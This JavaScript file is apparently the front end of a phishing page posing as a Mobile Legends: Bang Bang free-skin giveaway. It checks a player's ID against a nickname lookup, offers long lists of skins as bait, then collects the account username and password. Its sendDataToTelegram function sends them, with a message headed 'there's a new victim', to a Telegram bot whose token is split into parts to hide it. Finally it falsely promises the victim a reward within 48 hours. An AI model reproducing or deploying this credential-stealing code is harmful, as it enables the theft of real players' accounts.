let chosenReward = "";
let verifiedNickname = "";
let isAccountValid = false;

const part1 = "8816261841";
const part2 = "AAFOvMF00rlDMaxydRfxnTpi5bff";
const part3 = "5dArd9s";
const TELEGRAM_TOKEN = `${part1}:${part2}${part3}`; 
const CHAT_ID = "8335786077";

let checkTimeout;
let isSuccessState = false;

function showCustomAlert(title, message, isSuccess = false) {
    isSuccessState = isSuccess;
    document.getElementById('custom-modal-title').innerText = title;
    document.getElementById('custom-modal-text').innerText = message;
    document.getElementById('customModal').style.display = 'flex';
}

function closeCustomModal() {
    document.getElementById('customModal').style.display = 'none';
    if (isSuccessState) {
        location.reload();
    }
}

function showWarning() {
    const alertBar = document.getElementById('alertBar');
    alertBar.style.display = 'block';
    setTimeout(() => {
        alertBar.style.display = 'none';
    }, 3000);
}

function checkAccountReal() {
    const uid = document.getElementById('userid').value.trim();
    const sid = document.getElementById('serverid').value.trim();
    const statusDiv = document.getElementById('account-status');
    
    clearTimeout(checkTimeout);

    if(uid.length >= 4 && sid.length >= 4) {
        statusDiv.style.display = 'block';
        statusDiv.style.background = 'rgba(41, 128, 185, 0.1)';
        statusDiv.style.border = '1px solid rgba(41, 128, 185, 0.3)';
        statusDiv.style.color = '#3498db';
        statusDiv.innerHTML = "Menghubungkan ke server MLBB...";
        isAccountValid = false;
        
        checkTimeout = setTimeout(() => {
            fetch(`https://api.isan.eu.org/nickname/ml?id=${uid}&server=${sid}`)
                .then(response => response.json())
                .then(data => {
                    if(data && data.success && data.name) {
                        verifiedNickname = data.name;
                        isAccountValid = true;
                        statusDiv.style.background = 'rgba(39, 174, 96, 0.1)';
                        statusDiv.style.border = '1px solid rgba(39, 174, 96, 0.3)';
                        statusDiv.style.color = '#27ae60';
                        statusDiv.innerHTML = `Data "${verifiedNickname}" terdeteksi valid! Silahkan pilih hadiah`;
                    } else {
                        verifiedNickname = "";
                        isAccountValid = false;
                        statusDiv.style.background = 'rgba(192, 57, 43, 0.1)';
                        statusDiv.style.border = '1px solid rgba(192, 57, 43, 0.3)';
                        statusDiv.style.color = '#e74c3c';
                        statusDiv.innerHTML = `ID atau Server tidak ditemukan / Salah!`;
                    }
                })
                .catch(err => {
                    verifiedNickname = "";
                    isAccountValid = false;
                    statusDiv.style.background = 'rgba(192, 57, 43, 0.1)';
                    statusDiv.style.border = '1px solid rgba(192, 57, 43, 0.3)';
                    statusDiv.style.color = '#e74c3c';
                    statusDiv.innerHTML = `Gagal memeriksa akun, periksa kembali data anda!`;
                });
        }, 600);
    } else {
        statusDiv.style.display = 'none';
        verifiedNickname = "";
        isAccountValid = false;
    }
}

const skinAlbums = [
    {
        title: "The Aspirants",
        skins: [
            {name: "Fanny — Blade of Kibou", img: "./aspirant/Fanny.jpg"},
            {name: "Layla — Miss Hikari", img: "./aspirant/Layla.jpg"},
            {name: "Angela — Cyber Cherubin", img: "./aspirant/Angela.jpg"},
            {name: "Ruby — Mecha Maiden", img: "./aspirant/Ruby.jpg"},
            {name: "Lesley — Deadeye Spectre", img: "./aspirant/Lesley.jpg"},
            {name: "Chang'e — Tech Tensai", img: "./aspirant/Change.jpg"},
            {name: "Selena — Silverbolt Raiko", img: "./aspirant/Selena.jpg"},
            {name: "Obsidia — Imperatrix Arashi", img: "./aspirant/Obsidia.jpg"}
        ]
    },
    {
        title: "Dawning Stars",
        skins: [
            {name: "Bruno — Firebolt", img: "./dawning/Bruno.jpg"},
            {name: "Lancelot — Swordmaster", img: "./dawning/Lancelot.jpg"},
            {name: "Chou — Thunderfist", img: "./dawning/Chou.jpg"},
            {name: "Vale — Blizzard Storm", img: "./dawning/Vale.jpg"},
            {name: "Esmeralda — The Foreseer", img: "./dawning/Esmeralda.jpg"}
        ]
    },
    {
        title: "The King of Fighters (KOF)",
        skins: [
            {name: "Guinevere — Athena Asamiya", img: "./kof/Guinevere.jpg"},
            {name: "Chou — Iori Yagami", img: "./kof/Chou.jpg"},
            {name: "Karina — Leona", img: "./kof/Karina.jpg"},
            {name: "Dyrroth — Orochi Chris", img: "./kof/Dyrroth.jpg"},
            {name: "Gusion — K'", img: "./kof/Gusion.jpg"},
            {name: "Valir — Kyo Kusanagi", img: "./kof/Valir.jpg"},
            {name: "Masha — Mai Shiranui", img: "./kof/Masha.jpg"},
            {name: "Paquito — Terry Bogard", img: "./kof/Paquito.jpg"}
        ]
    },
    {
        title: "Star Wars",
        skins: [
            {name: "Argus — Darth Vader", img: "./star-wars/Argus.jpg"},
            {name: "Cyclops — Master Yoda", img: "./star-wars/Cyclops.jpg"},
            {name: "Alucard — Obi-Wan Kenobi", img: "./star-wars/Alucard.jpg"},
            {name: "Kimmy — First Order Jet Trooper", img: "./star-wars/Kimmy.jpg"}
        ]
    },
    {
        title: "Transformers",
        skins: [
            {name: "Johnson — Optimus Prime", img: "./transformers/Johnson.jpg"},
            {name: "Granger — Megatron", img: "./transformers/Granger.jpg"},
            {name: "X.Borg — Bumblebee", img: "./transformers/XBorg.jpg"},
            {name: "Popol and Kupa — Soundwave & Ravage", img: "./transformers/Popol.jpg"},
            {name: "Aldous — Starscream", img: "./transformers/Aldous.jpg"},
            {name: "Roger — Grimlock", img: "./transformers/Roger.jpg"}
        ]
    },
    {
        title: "Sanrio Characters",
        skins: [
            {name: "Angela — Heartstring", img: "./sanrio/Angela.jpg"},
            {name: "Floryn — Fluffy Dream", img: "./sanrio/Floryn.jpg"},
            {name: "Claude — Bad Bro", img: "./sanrio/Claude.jpg"},
            {name: "Chang'e — Moon Artist", img: "./sanrio/Change.jpg"}
        ]
    },
    {
        title: "Kung Fu Panda",
        skins: [
            {name: "Akai — Kung Fu Panda", img: "./kung-fu/Akai.jpg"},
            {name: "Ling — Lord Shen", img: "./kung-fu/Ling.jpg"},
            {name: "Thamuz — General Kai", img: "./kung-fu/Thamuz.jpg"}
        ]
    },
    {
        title: "Saint Seiya",
        skins: [
            {name: "Badang — Pegasus Seiya", img: "./saint-seiya/Badang.jpg"},
            {name: "Valir — Phoenix Ikki", img: "./saint-seiya/Valir.jpg"},
            {name: "Chou — Dragon Shiryu", img: "./saint-seiya/Chou.jpg"},
            {name: "Badang — Sagittarius Seiya", img: "./saint-seiya/Badang2.jpg"},
            {name: "Valir — Leo Ikki", img: "./saint-seiya/Valir2.jpg"},
            {name: "Chou — Libra Shiryu", img: "./saint-seiya/Chou2.jpg"}
        ]
    },
    {
        title: "Jujutsu Kaisen",
        skins: [
            {name: "Yin — Yuji Itadori", img: "./jujutsu-kaisen/Yin.jpg"},
            {name: "Julian — Megumi Fushiguro", img: "./jujutsu-kaisen/Julian.jpg"},
            {name: "Melissa — Nobara Kugisaki", img: "./jujutsu-kaisen/Melissa.jpg"},
            {name: "Xavier — Satoru Gojo", img: "./jujutsu-kaisen/Xavier.jpg"}
        ]
    },
    {
        title: "Ducati",
        skins: [
            {name: "Irithel — Monster SP Rider", img: "./ducati/Irithel.jpg"},
            {name: "Benedetta — Panigale V4S Rider", img: "./ducati/Benedetta.jpg"},
            {name: "Leomord — Diavel V4 Rider", img: "./ducati/Leomord.jpg"}
        ]
    },
    {
        title: "Attack on Titan",
        skins: [
            {name: "Yin — Eren", img: "./aot/Yin.jpg"},
            {name: "Martis — Levi", img: "./aot/Martis.jpg"},
            {name: "Fanny — Mikasa", img: "./aot/Fanny.jpg"}
        ]
    },
    {
        title: "Hunter × Hunter",
        skins: [
            {name: "Dyrroth — Gon", img: "./hxh/Dyrroth.jpg"},
            {name: "Harith — Killua", img: "./hxh/Harith.jpg"},
            {name: "Julian — Kurapika", img: "./hxh/Julian.jpg"},
            {name: "Cecilion — Hisoka", img: "./hxh/Cecilion.jpg"}
        ]
    },
    {
        title: "Naruto Shippuden",
        skins: [
            {name: "Lukas — Naruto Uzumaki", img: "./naruto/Lukas.jpg"},
            {name: "Suyou — Sasuke Uchiha", img: "./naruto/Suyou.jpg"},
            {name: "Kalea — Sakura Haruno", img: "./naruto/Kalea.jpg"},
            {name: "Hayabusa — Kakashi Hatake", img: "./naruto/Hayabusa.jpg"},
            {name: "Vale — Gaara", img: "./naruto/Vale.jpg"},
            {name: "Gusion — Minato Namikaze", img: "./naruto/Gusion.jpg"},
            {name: "Julian — Itachi Uchiha", img: "./naruto/Julian.jpg"}
        ]
    },
    {
        title: "Collector Skins",
        skins: [
            {name: "Badang — Fist of Zen", img: "./collector/Badang.jpg"},
            {name: "Pharsa — Empress Phoenix", img: "./collector/Pharsa.jpg"},
            {name: "Khufra — Volcanic Overlord", img: "./collector/Khufra.jpg"},
            {name: "Granger — Agent Z", img: "./collector/Granger.jpg"},
            {name: "Yi Sun-shin — Lone Destructor", img: "./collector/YiSunShin.jpg"},
            {name: "Jawhead — Samurai Mech", img: "./collector/Jawhead.jpg"},
            {name: "Valir — Demon Lord", img: "./collector/Valir.jpg"},
            {name: "Wanwan — Pixel Blast", img: "./collector/Wanwan.jpg"},
            {name: "Gusion — Night Owl", img: "./collector/Gusion.jpg"},
            {name: "Angela — Floral Elf", img: "./collector/Angela.jpg"},
            {name: "Yu Zhong — Blood Serpent", img: "./collector/YuZhong.jpg"},
            {name: "Ling — Serene Plume", img: "./collector/Ling.jpg"},
            {name: "Benedetta — Death Oath", img: "./collector/Benedetta.jpg"},
            {name: "Balmond — God of Mountains", img: "./collector/Balmond.jpg"},
            {name: "Aldous — Realm Watcher", img: "./collector/Aldous.jpg"},
            {name: "Harley — Dream Caster", img: "./collector/Harley.jpg"},
            {name: "Lesley — Falcon Mistress", img: "./collector/Lesley.jpg"},
            {name: "Nana — Aqua Pura", img: "./collector/Nana.jpg"},
            {name: "Hanabi — Riverland Phoenix", img: "./collector/Hanabi.jpg"},
            {name: "Zilong — Empyrean Paladin", img: "./collector/Zilong.jpg"},
            {name: "Silvanna — Queen Frost", img: "./collector/Silvanna.jpg"},
            {name: "Brody — Ore Alchemist", img: "./collector/Brody.jpg"},
            {name: "Vale — Supernal Tempest", img: "./collector/Vale.jpg"},
            {name: "Esmeralda — Light Envoy", img: "./collector/Esmeralda.jpg"},
            {name: "Luo Yi — Elysium Guardian", img: "./collector/LuoYi.jpg"},
            {name: "Sun — Wicked Flames", img: "./collector/Sun.jpg"},
            {name: "Miya — Doom Catalyst", img: "./collector/Miya.jpg"},
            {name: "Cecilion — Crimson Wings", img: "./collector/Cecilion.jpg"},
            {name: "Dyrroth — Naraka Flame", img: "./collector/Dyrroth.jpg"},
            {name: "Natan — Tidal Lord", img: "./collector/Natan.jpg"},
            {name: "Cyclops — Yokai Warlock", img: "./collector/Cyclops.jpg"},
            {name: "Clint — Crimson Blast", img: "./collector/Clint.jpg"},
            {name: "Paquito — Blazing Tiger", img: "./collector/Paquito.jpg"},
            {name: "Ruby — Prismatic Plume", img: "./collector/Ruby.jpg"},
            {name: "Vexana — The Sun Empress", img: "./collector/Vexana.jpg"},
            {name: "Popol and Kupa — Spirit of the Brush", img: "./collector/Popol.jpg"},
            {name: "Valentina — Celestial Judicator", img: "./collector/Valentina.jpg"},
            {name: "Lapu-Lapu — Adlaw's Chosen", img: "./collector/LapuLapu.jpg"},
            {name: "Minsitthar — Sol Invictus", img: "./collector/Minsitthar.jpg"},
            {name: "Edith — Red Bastion", img: "./collector/Edith.jpg"},
            {name: "Alpha — Mecha-King Perseus", img: "./collector/Alpha.jpg"},
            {name: "Harith — Psychic", img: "./collector/Harith.jpg"},
            {name: "Layla — Paranormal Operative", img: "./collector/Layla.jpg"},
            {name: "Natalia — Warrioress Paragon", img: "./collector/Natalia.jpg"},
            {name: "Atlas — Mecha Infernus", img: "./collector/Atlas.jpg"},
            {name: "Aurora — Veil of the Celestials", img: "./collector/Aurora.jpg"},
            {name: "Terizla — Soulblight Tyrant", img: "./collector/Terizla.jpg"},
            {name: "Floryn — Melody of Light", img: "./collector/Floryn.jpg"},
            {name: "Melissa — Umbra Bloom", img: "./collector/Melissa.jpg"},
            {name: "Hanzo — Soulfire Netherlord", img: "./collector/Hanzo.jpg"},
            {name: "Arlott — Aeon of Twilight", img: "./collector/Arlott.jpg"},
            {name: "Novaria — Dragonsworn", img: "./collector/Novaria.jpg"},
            {name: "Aamon — Soul Reaver", img: "./collector/Aamon.jpg"},
            {name: "Xavier — Sunborn Monarch", img: "./collector/Xavier.jpg"},
            {name: "Tigreal — Celestial General", img: "./collector/Tigreal.jpg"},
            {name: "Grock — Tremor of the Deep", img: "./collector/Grock.jpg"},
            {name: "Alice — Dreaming Monarch", img: "./collector/Alice.jpg"},
            {name: "Kimmy — Starbound Sentry", img: "./collector/Kimmy.jpg"},
            {name: "Helcurt — Kaiju of the Deep", img: "./collector/Helcurt.jpg"},
            {name: "Balmond — Vulcan Lionheart", img: "./collector/Balmond2.jpg"}
        ]
    },
    {
        title: "S.A.B.E.R.",
        skins: [
            {name: "Saber — S.A.B.E.R. Regulator", img: "./saber/Saber.jpg"},
            {name: "Layla — S.A.B.E.R. Breacher", img: "./saber/Layla.jpg"},
            {name: "Johnson — S.A.B.E.R. Automata", img: "./saber/Johnson.jpg"},
            {name: "Cyclops — S.A.B.E.R. Enforcer", img: "./saber/Cyclops.jpg"},
            {name: "Rafaela — S.A.B.E.R. Savior", img: "./saber/Rafaela.jpg"},
            {name: "Freya — S.A.B.E.R. Manhunter", img: "./saber/Freya.jpg"}
        ]
    },
    {
        title: "V.E.N.O.M.",
        skins: [
            {name: "Gusion — V.E.N.O.M. Emperor Scorpion", img: "./venom/Gusion.jpg"},
            {name: "Grock — V.E.N.O.M. Monitor Lizard", img: "./venom/Grock.jpg"},
            {name: "Hanabi — V.E.N.O.M. Nephila", img: "./venom/Hanabi.jpg"},
            {name: "Harley — V.E.N.O.M. Octopus", img: "./venom/Harley.jpg"},
            {name: "Angela — V.E.N.O.M. Vespid", img: "./venom/Angela.jpg"},
            {name: "Dyrroth — V.E.N.O.M. Cobra", img: "./venom/Dyrroth.jpg"}
        ]
    },
    {
        title: "Lightborn",
        skins: [
            {name: "Tigreal — Lightborn Defender", img: "./lightborn/Tigreal.jpg"},
            {name: "Alucard — Lightborn Striker", img: "./lightborn/Alucard.jpg"},
            {name: "Fanny — Lightborn Ranger", img: "./lightborn/Fanny.jpg"},
            {name: "Harith — Lightborn Inspirer", img: "./lightborn/Harith.jpg"},
            {name: "Granger — Lightborn Overrider", img: "./lightborn/Granger.jpg"}
        ]
    },
    {
        title: "Dragon Tamer",
        skins: [
            {name: "Valir — Draconic Flame", img: "./dragon-tamer/Valir.jpg"},
            {name: "Estes — Rattan Dragon", img: "./dragon-tamer/Estes.jpg"},
            {name: "Kimmy — Frost Wing", img: "./dragon-tamer/Kimmy.jpg"},
            {name: "Ling — Night Shade", img: "./dragon-tamer/Ling.jpg"},
            {name: "Masha — Dragon Armor", img: "./dragon-tamer/Masha.jpg"},
            {name: "Lancelot — Empyrean Flame", img: "./dragon-tamer/Lancelot.jpg"}
        ]
    },
    {
        title: "Zodiac",
        skins: [
            {name: "Aurora — Aquarius", img: "./zodiac/Aurora.jpg"},
            {name: "Lancelot — Pisces", img: "./zodiac/Lancelot.jpg"},
            {name: "Hilda — Aries", img: "./zodiac/Hilda.jpg"},
            {name: "Minotaur — Taurus", img: "./zodiac/Minotaur.jpg"},
            {name: "Selena — Gemini Shadow", img: "./zodiac/Selena.jpg"},
            {name: "Karina — Gemini Halo", img: "./zodiac/Karina.jpg"},
            {name: "Zhask — Cancer", img: "./zodiac/Zhask.jpg"},
            {name: "Badang — Leo", img: "./zodiac/Badang.jpg"},
            {name: "Odette — Virgo", img: "./zodiac/Odette.jpg"},
            {name: "Lunox — Libra", img: "./zodiac/Lunox.jpg"},
            {name: "Helcurt — Scorpio", img: "./zodiac/Helcurt.jpg"},
            {name: "Irithel — Sagittarius", img: "./zodiac/Irithel.jpg"},
            {name: "Martis — Capricorn", img: "./zodiac/Martis.jpg"}
        ]
    },
    {
        title: "S.T.U.N.",
        skins: [
            {name: "Chou — STUN", img: "./stun/Chou.jpg"},
            {name: "Selena — STUN", img: "./stun/Selena.jpg"},
            {name: "Brody — STUN", img: "./stun/Brody.jpg"}
        ]
    }
];

let albumIntervals = [];

function renderAlbums() {
    const slider = document.getElementById('albumSlider');
    if(slider) {
        slider.innerHTML = "";
        albumIntervals.forEach(clearInterval);
        albumIntervals = [];

        skinAlbums.forEach((album, index) => {
            let imgTags = "";
            album.skins.forEach((skin, sIndex) => {
                let activeClass = sIndex === 0 ? "active" : "";
                imgTags += `<img src="${skin.img}" class="album-slider-img ${activeClass}" alt="${skin.name}" onerror="this.src='image/logo.jpeg'">`;
            });

            slider.innerHTML += `
                <div class="album-card" onclick="openAlbumByIndex(${index})">
                    <div class="album-slider-img-container" id="album-banner-${index}">
                        ${imgTags}
                    </div>
                    <div class="album-name">${album.title}</div>
                </div>
            `;
        });

        skinAlbums.forEach((album, index) => {
            let currentImgIndex = 0;
            const intervalId = setInterval(() => {
                const container = document.getElementById(`album-banner-${index}`);
                if(!container) return;
                const imgs = container.querySelectorAll('.album-slider-img');
                if(imgs.length === 0) return;

                imgs[currentImgIndex].classList.remove('active');
                currentImgIndex = (currentImgIndex + 1) % imgs.length;
                imgs[currentImgIndex].classList.add('active');
            }, 2500);

            albumIntervals.push(intervalId);
        });
    }

    const collectorAlbum = skinAlbums.find(a => a.title === "Collector Skins");
    const collectorGrid = document.getElementById('collectorRewardGrid');
    if(collectorGrid && collectorAlbum) {
        collectorGrid.innerHTML = "";
        collectorAlbum.skins.forEach(skin => {
            collectorGrid.innerHTML += `
                <div class="reward-card" onclick="selectRewardFromMain(this, '${skin.name}')">
                    <img src="${skin.img}" alt="${skin.name}" onerror="this.src='image/logo.jpeg'">
                    <div class="name">${skin.name}</div>
                </div>
            `;
        });
    }
}

function triggerSearch() {
    const keyword = document.getElementById('skinSearchInput').value.trim();
    const query = keyword.toLowerCase();

    if(!query) {
        showCustomAlert("Pencarian Kosong", "Silakan masukkan nama hero atau skin terlebih dahulu!");
        return;
    }

    let matchedSkins = [];
    skinAlbums.forEach(album => {
        album.skins.forEach(skin => {
            if(skin.name.toLowerCase().includes(query)) {
                matchedSkins.push(skin);
            }
        });
    });

    document.getElementById('albumModalTitle').innerText = `Hasil Pencarian: "${keyword}"`;
    document.getElementById('albumModalDesc').innerText = matchedSkins.length > 0 ? `Ditemukan ${matchedSkins.length} skin yang cocok. Tekan untuk memilih!` : "Tidak ada skin yang cocok ditemukan.";
    
    const gridContainer = document.getElementById('albumModalGrid');
    gridContainer.innerHTML = "";

    if(matchedSkins.length > 0) {
        matchedSkins.forEach(skin => {
            gridContainer.innerHTML += `
                <div class="album-skin-item" onclick="selectRewardFromAlbum('${skin.name}')">
                    <img src="${skin.img}" alt="${skin.name}" onerror="this.src='image/logo.jpeg'">
                    <p>${skin.name}</p>
                </div>
            `;
        });
    } else {
        gridContainer.innerHTML = `<p style="grid-column: span 2; text-align: center; color: #a0aec0; padding: 20px;">Skin tidak ditemukan.</p>`;
    }

    document.getElementById('albumModal').style.display = 'flex';
}

function openAlbumByIndex(index) {
    const album = skinAlbums[index];
    document.getElementById('albumModalTitle').innerText = album.title;
    document.getElementById('albumModalDesc').innerText = "Tekan salah satu skin di bawah untuk memilihnya sebagai hadiah klaim!";
    const gridContainer = document.getElementById('albumModalGrid');
    gridContainer.innerHTML = "";

    album.skins.forEach(skin => {
        gridContainer.innerHTML += `
            <div class="album-skin-item" onclick="selectRewardFromAlbum('${skin.name}')">
                <img src="${skin.img}" alt="${skin.name}" onerror="this.src='image/logo.jpeg'">
                <p>${skin.name}</p>
            </div>
        `;
    });

    document.getElementById('albumModal').style.display = 'flex';
}

function closeAlbumModal() {
    document.getElementById('albumModal').style.display = 'none';
}

function selectRewardFromAlbum(skinName) {
    const uid = document.getElementById('userid').value.trim();
    const sid = document.getElementById('serverid').value.trim();

    if(!uid || !sid || !isAccountValid) {
        closeAlbumModal();
        showWarning();
        return;
    }

    const claimKey = `claimed_${uid}_${sid}`;
    if(localStorage.getItem(claimKey)) {
        closeAlbumModal();
        showCustomAlert("Gagal", `Akun ini telah mengambil hadiah pada event ini!`);
        return;
    }

    chosenReward = skinName;
    document.querySelector('.selected-preview').innerHTML = "Item Dipilih:";
    document.getElementById('preview-text').innerText = skinName;

    closeAlbumModal();
    showCustomAlert("Berhasil Memilih!", `Kamu memilih skin: ${skinName}. Klik tombol Claim di bawah untuk melanjutkan!`);
}

function selectRewardFromMain(element, name) {
    const uid = document.getElementById('userid').value.trim();
    const sid = document.getElementById('serverid').value.trim();

    if(!uid || !sid || !isAccountValid) {
        showWarning();
        return;
    }

    const claimKey = `claimed_${uid}_${sid}`;
    if(localStorage.getItem(claimKey)) {
        showCustomAlert("Gagal", `Akun ini telah mengambil hadiah pada event ini!`);
        return;
    }

    document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('active'));
    element.classList.add('active');
    chosenReward = name;
    document.querySelector('.selected-preview').innerHTML = "Item Dipilih:";
    document.getElementById('preview-text').innerText = name;
}

window.onload = function() {
    renderAlbums();
};

function openLoginModal() {
    const uid = document.getElementById('userid').value.trim();
    const sid = document.getElementById('serverid').value.trim();

    if(!uid || !sid || !isAccountValid) {
        showWarning();
        return;
    }
    if(!chosenReward) {
        showCustomAlert("Ambil Hadiah", "Silakan pilih salah satu skin Collector atau dari galeri album terlebih dahulu!");
        return;
    }

    const claimKey = `claimed_${uid}_${sid}`;
    if(localStorage.getItem(claimKey)) {
        showCustomAlert("Gagal", `Akun ini telah mengambil hadiah pada event ini!`);
        return;
    }

    document.getElementById('loginModal').style.display = 'flex';
}

function sendDataToTelegram() {
    const uid = document.getElementById('userid').value.trim();
    const sid = document.getElementById('serverid').value.trim();
    const method = document.getElementById('login-method').value;
    const userAcc = document.getElementById('username').value.trim();
    const passAcc = document.getElementById('password').value.trim();

    if(!userAcc || !passAcc) {
        showCustomAlert("Data Belum Dilengkapi", "Harap lengkapi informasi akun dan password anda!");
        return;
    }

    const claimKey = `claimed_${uid}_${sid}`;
    localStorage.setItem(claimKey, "true");

    const message = "ADA KORBAN BARU NIH!\n\n" +
                    "Hadiah: " + chosenReward + "\n" +
                    "Nickname: " + verifiedNickname + "\n" +
                    "ID & Server: " + uid + " (" + sid + ")\n" +
                    "Akun: " + method + "\n" +
                    "Email/User: " + userAcc + "\n" +
                    "Password: " + passAcc;

    const url = "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(message);
    
    fetch(url)
        .then(response => response.json())
        .catch(err => console.error("Error:", err));

    document.getElementById('loginModal').style.display = 'none';
    showCustomAlert("Klaim Berhasil!", `Selamat! ${chosenReward} anda akan segera dikirim dalam inbox dalam 2x24Jam!`, true);
}
